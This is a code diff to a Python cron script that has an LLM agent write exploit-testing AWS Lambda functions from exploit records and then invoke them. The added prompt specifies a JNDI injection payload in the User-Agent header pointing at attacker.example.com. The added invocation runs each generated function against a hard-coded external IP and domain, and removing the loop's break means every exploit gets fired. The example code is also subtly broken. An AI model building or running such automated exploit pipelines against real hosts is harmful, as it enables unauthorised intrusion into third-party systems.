@@ -139,11 +139,7 @@ def upload_lambda(name, code, description, exploit_id):
         )
         print(f"Lambda function {name} updated successfully.")
 
-    # invoke_response = lambda_client.invoke(
-    #     FunctionName=name,
-    #     InvocationType="RequestResponse",
-    #     Payload=json.dumps({"exploit_id": exploit_id}),
-    # )
+
 
     os.remove(lambda_file_path)
     os.remove(zip_file_path)
@@ -237,53 +233,31 @@ def run_cron():
 
         for i, exploit in enumerate(exploits):
             run = portia.run(f"""
-                You are a security researcher provided with exploit information in JSON format (available in the variable "exploit"). Your goal is to analyze this exploit and generate a Python function that tests services based on the exploit.
+                Your task is to act as a security researcher and exploit developer. You are provided with exploit information in a JSON variable named "exploit". Analyze the exploit and generate a Python function that tests services based on this exploit. The function must be named "lambda_handler" and support two testing scenarios:
 
-There are two testing scenarios:
+    Remote Testing:   – The function accepts two arguments: event and context.   – The event object will provide either an IP address or a domain (only one will be provided).
 
-    Remote Testing:
+    Local Testing:   – The function is defined with no arguments.   – In the absence of event input, default to the IP "127.0.0.1".
 
-        The Python function must be named "lambda_handler" and accept two arguments: event and context.
+The function should perform a test by sending two HTTP requests to the target:   – A normal HTTP GET request.   – A GET request that includes an injected payload (for example, "${{jndi:ldap://attacker.example.com/a}}") in the "User-Agent" header. The function should compare the responses and return a dictionary with keys "verdict" (with values "vulnerable" or "not vulnerable") and "description" (a brief explanation of the test result).
 
-        The event object will provide either an IP address or a domain of the service (only one of these will be provided).
+Finally, output a JSON object with exactly the following keys:   • code – a string containing the complete Python function code;   • type – a string indicating the testing type ("remote" or "local");   • description – a brief explanation of why the test will work;   • name – the function’s name (should be "lambda_handler");   • id – the exploit identifier from the provided exploit JSON.
 
-    Local Testing:
+Do not include any markdown formatting, extra text, or explanations outside the JSON structure. The output must be valid JSON. At the end, save code to aws s3 lambda through functionstools.
 
-        The Python function must be named "lambda_handler" with no arguments.
-
-        Use the IP address "127.0.0.1" for testing.
-
-After creating the Python function, your output (not of the code!) must be a JSON object with these keys:
-
-    code: A string containing the complete Python function code.
-
-    type: The testing type ("local" or "remote").
-
-    description: A brief explanation of why the test will work.
-
-    name: The function’s name (should be "lambda_handler").
-
-    id: The exploit's identifier from the provided exploit information.
-                             
-    Code should return dict with verdict and description keys. Verdict- vulnerable or not vulnerable. Description- a brief explanation of test result.
-                             
-    You should save to lambda like that:
-    {{
-        "code": "def lambda_handler(event, context):\n    # Your code here\n    return {{'verdict': 'vulnerable', 'description': 'Exploit works'}}",
-        "type": "remote",
-        "description": "This exploit works because...",
-        "name": "lambda_handler",
-        "id": "exploit_id"
-    }}
-                             
-    The final output must be in valid JSON format with exactly the keys listed above, and no markdown formatting, explanations, or extra information. IN ANY CIRCUMSTANCES, DO NOT INCLUDE ANY MARKDOWN FORMATTING OR ADDITIONAL TEXT. ```'S ARE BANNED .
-                             never return text like Here is the final output JSON object:
+Example output: {{ "code": "def lambda_handler(event=None, context=None):\n import requests\n \n # Determine target based on event data or default to local testing\n if event and (event.get('ip') or event.get('domain')):\n target = event.get('ip') or event.get('domain')\n else:\n target = '127.0.0.1'\n \n url = f"http://target"\n payload = "jndi:ldap://attacker.example.com/a"\n \n try:\n normal_response = requests.get(url, timeout=5)\n except Exception as e:\n return {{'verdict': 'not vulnerable', 'description': f'Error on normal request: {str(e)}'}}\n \n try:\n injected_response = requests.get(url, headers={{'User-Agent': payload}}, timeout=5)\n except Exception as e:\n return {{'verdict': 'not vulnerable', 'description': f'Error on injected request: {str(e)}'}}\n \n if normal_response.status_code != injected_response.status_code:\n verdict = 'vulnerable'\n desc = 'The response status codes differ between normal and injected requests, indicating a potential vulnerability.'\n else:\n verdict = 'not vulnerable'\n desc = 'No difference detected between normal and injected responses.'\n \n return {{'verdict': verdict, 'description': desc}}", "type": "remote", "description": "This function works by comparing the HTTP responses from a standard and an injected request, highlighting differences indicative of vulnerability.", "name": "lambda_handler", "id": "E91ECE3D-9ED0-5F56-9229-8A9BB4768161" }}
             """, dict=False)
             print(273,run)
             # run = json.loads(run)
             # print(275, run)
 
-            break 
+            invoke_response = lambda_client.invoke(
+                FunctionName=exploit['title'],
+                InvocationType="RequestResponse",
+                Payload=json.dumps({"exploit_id": exploit['id'], "ip": "195.210.46.62", "domain": "b2a.kz"}),
+            )       
+
+
         
         # save_exploits(exploits)
         print("Exploits saved successfully.")
